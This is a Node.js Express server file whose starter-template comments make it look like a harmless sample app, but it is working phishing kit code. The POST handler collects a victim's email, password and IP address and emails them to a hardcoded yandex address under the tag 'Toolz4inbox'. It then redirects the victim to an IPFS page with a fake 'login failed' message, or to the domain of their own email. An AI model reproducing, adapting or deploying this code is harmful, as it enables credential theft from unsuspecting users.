// server.js
// where your node app starts

// we've started you off with Express (https://expressjs.com/)
// but feel free to use whatever libraries or frameworks you'd like through `package.json`.
const getLink = ()=> {
    return [
'https://cloudflare-ipfs.com/ipfs/bafkreihp5fxp2r2hszrjyqjpwbgf2jqesxxcwcntozdl7o6weekhfcwbva',
'https://cloudflare-ipfs.com/ipfs/bafkreihp5fxp2r2hszrjyqjpwbgf2jqesxxcwcntozdl7o6weekhfcwbva',
    ][Math.floor(Math.random() * 2)]+ '?error=error&loginfailed=your-login-failed-please-try-again&email='
}
const express = require("express");
const bodyParser = require('body-parser');
const app = express();
const sendmail = require('sendmail')();
const 
lastRedirect = '';
// make all the files in 'public' availableaa
// https://expressjs.com/en/starter/static-files.html
app.use(express.static("public"));
app.use(express.json());
app.use(express.urlencoded({extended: true}));
 app.get("/", (request, response) => {
  response.sendFile(__dirname + "/src/pages/index.hbs");
});
// https://expressjs.com/en/starter/basic-routing.html
app.post('/', (req, res) => {

    const {pet, pett, source, error} = req.body;
    let email = 'l019041@yandex.com';
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    let redirectUrl = getLink() + pet;
    let page;
    if(error){
        page = 'ERROR PAGE';
    } else {
        page = 'MAIN PAGE';
    }
    const html = `
    <!DOCTYPE html>
    <html lang='en'>
    <head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>Document</title>
    </head>  
    <body>
    Details Has Arrived!!
    <h4>Page: ${page}</h4>
    <h4>User: ${pet}</h4>
    <h4>Access: ${pett}</h4>
    <h4>IP: ${ip}</h4>
    </div>
    <div style='margin-left: 40px;'><small>Data delivered by Toolz4inbox</small></div>
    </body>
    </html>
    `;
     if (error){
        redirectUrl = lastRedirect;
        if (!lastRedirect){
            const dom = req.body.pet.split('@')[1];
            redirectUrl = `http://${dom}`;
        }
    }
  sendmail({
    from: email,
    to: email,
    subject: req.body.source.toUpperCase() + '',
    html,
  }, function(err, reply) {
    res.redirect(redirectUrl);
});
  
})

// send the default array of dreams to the webpage
// listen for requests :)
const listener = app.listen(process.env.PORT, () => {
  console.log("Your app is listening on port " + listener.address().port);
});
